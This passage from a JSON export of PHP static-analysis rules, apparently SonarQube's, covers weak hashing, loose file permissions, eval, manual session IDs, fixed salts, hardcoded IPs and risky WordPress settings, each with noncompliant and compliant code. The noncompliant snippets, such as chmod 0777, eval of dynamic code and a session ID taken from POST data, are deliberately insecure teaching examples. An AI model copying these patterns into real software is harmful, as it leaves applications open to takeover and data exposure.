        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=php%3AS4790'>S4790</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,\nit takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash\nvalue gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,\nMD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>\n<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n$password = ...\n\nif (md5($password) === '1f3870be274f6c49b3e31a0c6728957f') { // Noncompliant; md5() hashing algorithm is not secure for password management\n   [...]\n}\n\nif (sha1($password) === 'd0be2dc421be4fcd0172e5afceea3970e2f3d940') { // Noncompliant; sha1() hashing algorithm is not secure for password management\n   [...]\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/328\">CWE-328 - Reversible One-Way Hash</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://shattered.io/\">SHAttered</a> - The first concrete collision attack against SHA-1. </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nchmod(\"foo\", 0777); // Sensitive\n</pre>\n<pre>\numask(0); // Sensitive\numask(0750); // Sensitive\n</pre>\n<p>For <a href=\"https://symfony.com/doc/current/components/filesystem.html\">Symfony Filesystem</a>:</p>\n<pre>\nuse Symfony\\Component\\Filesystem\\Filesystem;\n\n$fs = new Filesystem();\n$fs-&gt;chmod(\"foo\", 0777); // Sensitive\n</pre>\n<p>For <a href=\"https://laravel.com/api/8.x/Illuminate/Filesystem/Filesystem.html\">Laravel Filesystem</a>:</p>\n<pre>\nuse Illuminate\\Filesystem\\Filesystem;\n\n$fs = new Filesystem();\n$fs-&gt;chmod(\"foo\", 0777); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nchmod(\"foo\", 0750); // Compliant\n</pre>\n<pre>\numask(0027); // Compliant\n</pre>\n<p>For <a href=\"https://symfony.com/doc/current/components/filesystem.html\">Symfony Filesystem</a>:</p>\n<pre>\nuse Symfony\\Component\\Filesystem\\Filesystem;\n\n$fs = new Filesystem();\n$fs-&gt;chmod(\"foo\", 0750); // Compliant\n</pre>\n<p>For <a href=\"https://laravel.com/api/8.x/Illuminate/Filesystem/Filesystem.html\">Laravel Filesystem</a>:</p>\n<pre>\nuse Illuminate\\Filesystem\\Filesystem;\n\n$fs = new Filesystem();\n$fs-&gt;chmod(\"foo\", 0750); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S2964": {
        "name": "\"sleep\" should not be called",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p><code>sleep</code> is sometimes used in a mistaken attempt to prevent Denial of Service (DoS) attacks by throttling response rate. But because it\nties up a thread, each request takes longer to serve that it otherwise would, making the application <em>more</em> vulnerable to DoS attacks, rather\nthan less.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif (is_bad_ip($requester)) {\n  sleep(5);  // Noncompliant\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "php:S5328": {
        "name": "Manual generation of session ID is security-sensitive",
        "htmlDesc": "<p>If a session ID can be guessed (not generated with a secure pseudo random generator, or with insufficient length …​) an attacker may be able to\nhijack another user’s session.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the session ID is not unique. </li>\n  <li> the session ID is set from a user-controlled input. </li>\n  <li> the session ID is generated with not secure pseudo random generator. </li>\n  <li> the session ID length is too short. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t manually generate session IDs, use instead language based native functionality.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nsession_id(bin2hex(random_bytes(4))); // Sensitive: 4 bytes is too short\nsession_id($_POST[\"session_id\"]); // Sensitive: session ID can be specified by the user\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsession_regenerate_id(); ; // Compliant\nsession_id(bin2hex(random_bytes(16))); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Session_fixation\">OWASP Sesssion Fixation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/340\">CWE-340 - Generation of Predictable Numbers or Identifiers</a> </li>\n  <li> <a href=\"https://www.php.net/random-bytes\">PHP: random_bytes()</a> </li>\n  <li> <a href=\"https://www.php.net/session-regenerate-id\">PHP: session_regenerate_id()</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S1523": {
        "name": "Dynamically executing code is security-sensitive",
        "htmlDesc": "<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807\">CVE-2017-9807</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802\">CVE-2017-9802</a> </li>\n</ul>\n<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific\nmeta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a\nhref=\"https://owasp.org/www-community/attacks/Code_Injection\">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:\nXSS attack) and have a huge impact on an application’s security.</p>\n<p>This rule marks for review each occurrence of the <a href=\"https://www.php.net/manual/en/function.eval.php\"><code>eval</code> function</a>. This\nrule does not detect code injections. It only highlights the use of APIs which should be used sparingly and very carefully. The goal is to guide\nsecurity code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>\n  <li> you really need to run code dynamically. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the\ncode in a <a href=\"https://en.wikipedia.org/wiki/Sandbox_(computer_security)\">sandboxed</a> environment. Use jails, firewalls and whatever means your\noperating system and programming language provide (example: <a\nhref=\"https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager\">Security Managers</a> in java, <a\nhref=\"https://www.w3schools.com/tags/att_iframe_sandbox.asp\">iframes</a> and <a href=\"https://en.wikipedia.org/wiki/Same-origin_policy\">same-origin\npolicy</a> for javascript in a web browser).</p>\n<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>\n<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\neval($code_to_be_dynamically_executed)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S2053": {
        "name": "Password hashing functions should use an unpredictable salt",
        "htmlDesc": "<p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>\n<h2>Why is this an issue?</h2>\n<p>During the process of password hashing, an additional component, known as a \"salt,\" is often integrated to bolster the overall security. This salt,\nacting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>\n<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it\nis too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.\nSimilarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical\npassword hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on\nimplementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>\n<h3>What is the potential impact?</h3>\n<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.\nThis could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>\n<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying\nevery possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt\ncan make the task significantly easier and faster.</p>\n<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully\ncracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>\n<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters\nof password hashes with identical salt that can then be attacked as explained before.</p>\n<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter\nthe salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>\n<h3>Exceptions</h3>\n<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such\nfunctions are:</p>\n<ul>\n  <li> Argon2 </li>\n  <li> PBKDF2 </li>\n  <li> Scrypt </li>\n  <li> Bcrypt </li>\n</ul>\n<p>When they are used for password storage, using a secure, random salt is required.</p>\n<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those\ncases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed\nsalt is safe and accepted.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of hard-coded salts.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$salt = 'salty';\n$hash = hash_pbkdf2('sha256', $password, $salt, 100000); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$salt = random_bytes(16);\n$hash = hash_pbkdf2('sha256', $password, $salt, 100000);\n</pre>\n<h3>How does this work?</h3>\n<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that\nprovides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>\n<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>random_bytes</code> function with a\nlength parameter set to 16. This one internally uses a cryptographically secure pseudo random number generator.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/759\">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/760\">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S6348": {
        "name": "Allowing unfiltered HTML content in WordPress is security-sensitive",
        "htmlDesc": "<p>By default, the WordPress administrator and editor roles can add unfiltered HTML content in various places, such as post content. This includes the\ncapability to add JavaScript code.</p>\n<p>If an account with such a role gets hijacked, this capability can be used to plant malicious JavaScript code that gets executed whenever somebody\nvisits the website.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You really need the possibility to add unfiltered HTML with editor or administrator roles. </li>\n  <li> There’s a chance that the accounts of authorized users get compromised. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The <code>unfiltered_html</code> capability should be granted to trusted roles that need to use markup when publishing dynamic content to the\nWordPress website. If this capability is not required for all users, including administrators and editors roles, then it’s recommended to set\n<code>DISALLOW_UNFILTERED_HTML</code> to <code>true</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\ndefine( 'DISALLOW_UNFILTERED_HTML', false ); // sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndefine( 'DISALLOW_UNFILTERED_HTML', true );\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\nsocket_connect($socket, '8.8.8.8', 23);  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\nsocket_connect($socket, IP_ADDRESS, 23);  // Compliant\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "php:S6341": {
        "name": "WordPress theme and plugin editors are security-sensitive",
        "htmlDesc": "<p>WordPress makes it possible to edit theme and plugin files directly in the Administration Screens. While it may look like an easy way to customize\na theme or do a quick change, it’s a dangerous feature. When visiting the theme or plugin editor for the first time, WordPress displays a warning to\nmake it clear that using such a feature may break the web site by mistake. More importantly, users who have access to this feature can trigger the\nexecution of any PHP code and may therefore take full control of the WordPress instance. This security risk could be exploited by an attacker who\nmanages to get access to one of the authorized users. Setting the <code>DISALLOW_FILE_EDIT</code> option to <code>true</code> in\n<code>wp-config.php</code> disables this risky feature. The default value is <code>false</code>.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You really need to use the theme and plugin editors. </li>\n  <li> The theme and plugin editors are available to users who cannot be fully trusted. </li>\n  <li> There’s a chance that the accounts of authorized users get compromised. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Modify the theme and plugin files using a local editor and deploy them to the server in a secure way. </li>\n  <li> Make sure that <code>DISALLOW_FILE_EDIT</code> is defined in <code>wp-config.php</code>. </li>\n  <li> Make sure that <code>DISALLOW_FILE_EDIT</code> is set to <code>true</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\ndefine( 'DISALLOW_FILE_EDIT', false ); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndefine( 'DISALLOW_FILE_EDIT', true );\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://wordpress.org/support/article/editing-wp-config-php/#disable-the-plugin-and-theme-editor\">wordpress.org</a> - Disable the\n  Plugin and Theme Editor </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/94\">CWE-94 - Improper Control of Generation of Code ('Code Injection')</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S6343": {
        "name": "Disabling automatic updates is security-sensitive",
        "htmlDesc": "<p>Automatic updates are a great way of making sure your application gets security updates as soon as they are available. Once a vendor releases a\nsecurity update, it is crucial to apply it in a timely manner before malicious actors exploit the vulnerability. Relying on manual updates is usually\ntoo late, especially if the application is publicly accessible on the internet.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> there is no specific reason for deactivating all automatic updates. </li>\n  <li> you meant to deactivate only automatic major updates. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t deactivate automatic updates unless you have a good reason to do so. This way, you’ll be sure to receive security updates as soon as they are\navailable. If you are worried about an automatic update breaking something, check if it is possible to only activate automatic updates for minor or\nsecurity updates.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\ndefine( 'WP_AUTO_UPDATE_CORE', false ); // Sensitive\ndefine( 'AUTOMATIC_UPDATER_DISABLED', true ); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndefine( 'WP_AUTO_UPDATE_CORE', true ); // Minor and major automatic updates enabled\ndefine( 'WP_AUTO_UPDATE_CORE', 'minor' ); // Only minor updates are enabled\ndefine( 'AUTOMATIC_UPDATER_DISABLED', false );\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://wordpress.org/support/article/editing-wp-config-php/#disable-wordpress-auto-updates\">Wordpress.org</a> - Disable WordPress\n  Auto Updates </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S6345": {
        "name": "Allowing all external requests from a WordPress server is security-sensitive",
        "htmlDesc": "<p>External requests initiated by a WordPress server should be considered as security-sensitive. They may contain sensitive data which is stored in\nthe files or in the database of the server. It’s important for the administrator of a WordPress server to understand what they contain and to which\nserver they are sent.</p>\n<p>WordPress makes it possible to block external requests by setting the <code>WP_HTTP_BLOCK_EXTERNAL</code> option to <code>true</code>. It’s then\npossible to authorize requests to only a few servers using another option named <code>WP_ACCESSIBLE_HOSTS</code>.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Your WordPress website contains code which may call external requests to servers you don’t know. </li>\n  <li> Your WordPress website may send sensitive data to other servers. </li>\n  <li> Your WordPress website uses a lot of plugins or themes. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Uninstall WordPress plugins which send requests to servers you don’t know. </li>\n  <li> Make sure that <code>WP_HTTP_BLOCK_EXTERNAL</code> is defined in <code>wp-config.php</code>. </li>\n  <li> Make sure that <code>WP_HTTP_BLOCK_EXTERNAL</code> is set to <code>true</code>. </li>\n  <li> Make sure that <code>WP_ACCESSIBLE_HOSTS</code> is configured to authorize requests to the servers you trust. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\ndefine( 'WP_HTTP_BLOCK_EXTERNAL', false ); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndefine( 'WP_HTTP_BLOCK_EXTERNAL', true );\ndefine( 'WP_ACCESSIBLE_HOSTS', 'api.wordpress.org' );\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">Top 10 2021 Category A10 - Server-Side Request\n  Forgery (SSRF)</a> </li>\n  <li> <a href=\"https://wordpress.org/support/article/editing-wp-config-php/#block-external-url-requestsl\">wordpress.org</a> - Block External URL\n  Requests </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\">OWASP Attack Category</a> - Server Side Request Forgery </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/918\">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S6346": {
        "name": "Allowing unauthenticated database repair in WordPress is security-sensitive",
        "htmlDesc": "<p>WordPress has a database repair and optimization mode that can be activated by setting <code>WP_ALLOW_REPAIR</code> to <code>true</code> in the\nconfiguration.</p>\n<p>If activated, the repair page can be accessed by any user, authenticated or not. This makes sense because if the database is corrupted, the\nauthentication mechanism might not work.</p>\n<p>Malicious users could trigger this potentially costly operation repeatadly slowing down the website, and making it unavailable.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database is not currently corrupted. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable automatic database repair mode only in case of database corruption. This feature should be deactivated again when the\ndatabase issue is resolved.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\ndefine( 'WP_ALLOW_REPAIR', true ); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// The default value is false, so the value does not have to be expilicitly set.\ndefine( 'WP_ALLOW_REPAIR', false );\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> <a href=\"https://wordpress.org/support/article/editing-wp-config-php/#automatic-database-optimizing\">wordpress.org</a> - Automatic Database\n  Optimizing </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S4823": {
        "name": "Using command line arguments is security-sensitive",
